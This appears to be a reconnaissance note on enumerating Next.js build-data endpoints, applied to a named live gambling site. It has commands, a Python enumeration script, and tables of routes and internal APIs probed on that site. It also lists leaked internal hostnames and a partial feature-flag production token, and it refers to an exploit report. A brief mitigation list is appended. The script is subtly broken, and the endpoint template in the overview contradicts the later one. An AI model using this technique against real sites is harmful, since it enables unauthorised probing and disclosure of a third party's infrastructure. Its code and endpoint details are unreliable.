# Next.js Build Artifact Enumeration

## Overview
Next.js applications expose dynamic route information through `/_{build_id}/locale{route}.json` endpoints. This file documents the discovery pattern and common build ID extraction methods.

## Build ID Discovery

### Method 1: From HTML Script Tag
```html
<script id="__NEXT_DATA__" type="application/json">
  {"buildId":"9PUvq50PPPCPRUWylQS4J","page":"/"}
</script>
```

**Extraction:**
```bash
grep -oE '"buildId":"[^"]+"' /tmp/page.html | cut -d'"' -f4
```

### Method 2: Direct URL Guessing
```
/_next/data/9PUvq50PPPCPRUWylQS4J/id.json
/_next/data/9PUvq50PPPCPRUWylQS4J/en.json
```

## Route Enumeration Pattern

**Endpoint template:**
```
https://target.com/_next/data/{BUILD_ID}/{LOCALE}{ROUTE}.json
```

**Common locales:**
- `id` (Indonesian)
- `en` (English)
- `default` or empty string

**Route examples tested against superjponfire.com:**
| Route | Status | Data Size |
|-------|--------|-----------|
| / | ✓ 200 | ~50KB |
| /login | ✓ 200 | ~27KB |
| /register | ✓ 200 | ~39KB |
| /profile | ✓ 200 | Contains env vars |
| /deposit | ✓ 200 | Contains payment config |
| /withdraw | ✓ 200 | Contains withdrawal list |
| /slot-game | ✓ 200 | ~23KB |
| /live-casino | ✓ 200 | ~22KB |
| /sportsbook | ✓ 200 | ~22KB |

## Environment Variable Extraction

The `/profile` and `/deposit` routes expose critical configuration in `pageProps.env`:

**Sensitive keys found:**
```javascript
NEXT_PUBLIC_PORTAL_API_URL: https://v1008.p120p0ap1.xyz/v1
NEXT_PUBLIC_INTEGRATION_API_URL: https://v1008.p1201nt.xyz/v1  
NEXT_PUBLIC_COMPANY_API_URL: https://api.vsuperadmin.com/api/v1/
NEXT_PUBLIC_WEBSOCKET_URL: wss://v1008.wesopro.xyz/ws/v1
NEXT_PUBLIC_UNLEASH_FRONTEND_API_TOKEN: *:production.c996169...
NEXT_PUBLIC_CDN_URL: https://imajadulu.b-cdn.net/...
```

## API Endpoint Status

After discovering endpoints from environment variables, test accessibility:

| Base URL | Root Response | Protected Paths |
|----------|---------------|-----------------|
| v1008.p120p0ap1.xyz/v1 | 404 | Internal only |
| v1008.p1201nt.xyz/v1 | 404 | Integration |
| api.vsuperadmin.com/api/v1/ | 403 Forbidden | All paths blocked |
| www.p120p0p1mt.xyz/v2 | 404 | Multi-brand |

## Python Extraction Script

```python
import requests
import json
import re

def discover_nextjs_routes(url, build_id):
    """Discover all accessible routes via _next/data endpoint"""
    routes = []
    
    # Test common routes
    common_paths = [
        '', '/login', '/register', '/profile', '/account',
        '/deposit', '/withdraw', '/dashboard', '/admin'
    ]
    
    for path in common_paths:
        locale_path = f'id{path}' if path else 'id'
        data_url = f'{url}/_next/data/{build_id}/{locale_path}.json'
        
        response = requests.get(data_url, timeout=15)
        if response.status_code == 200:
            data = response.json()
            routes.append({
                'route': path or '/',
                'data_size': len(response.content),
                'props': list(data.get('pageProps', {}).keys())
            })
    
    return routes

def extract_env_vars(routes_data):
    """Extract NEXT_PUBLIC_* variables from route data"""
    env_vars = {}
    
    for route in routes_data:
        if 'env' in route.get('props', {}):
            env = route['props']['env']
            env_vars.update(env)
    
    return env_vars

# Usage
build_id = '9PUvq50PPPCPRUWylQS4J'
routes = discover_nextjs_routes('https://www.superjponfire.com', build_id)
env = extract_env_vars(routes)
print(json.dumps(env, indent=2))
```

## Mitigation Recommendations

For site operators:
1. Remove sensitive config from `NEXT_PUBLIC_*` variables
2. Move API URLs to server-side environment variables only
3. Restrict access to `/_next/data/*` via authentication
4. Never expose internal service names or tokens client-side
5. Implement proper CORS on internal APIs
6. Use separate build ID rotation strategy

## Session Reference

This enumeration technique was applied to:
- **Target:** https://www.superjponfire.com/
- **Date:** 2026-08-29
- **Build ID:** 9PUvq50PPPCPRUWylQS4J
- **Framework:** Next.js with i18n support
- **Findings:** Full infrastructure disclosure, Unleash token leak

See full report: `/tmp/exploit-report-superjp.md`
